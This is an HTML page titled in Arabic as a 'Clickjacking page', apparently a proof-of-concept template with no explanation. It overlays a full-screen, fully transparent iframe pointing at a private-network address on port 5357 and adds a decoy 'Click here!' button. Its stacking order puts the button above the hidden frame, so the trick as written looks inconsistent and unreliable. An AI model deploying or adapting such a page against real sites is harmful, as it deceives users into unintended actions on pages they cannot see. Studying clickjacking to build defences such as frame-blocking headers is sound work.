<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة Clickjacking</title>
    <style>
        body { margin: 0; padding: 0; }
        #myIframe { 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            opacity: 0; /* يجعل الإطار غير مرئي */
            z-index: 10; 
        }
        #clickButton {
            position: relative; 
            z-index: 20; 
            padding: 20px; 
            background-color: #4CAF50; 
            color: white; 
            border: none; 
            font-size: 16px;
        }
    </style>
</head>
<body>
    <iframe id="myIframe" src="http://192.168.70.116:5357"></iframe>
    <button id="clickButton" onclick="alert('تم النقر!')">اضغط هنا!</button>
</body>
</html>
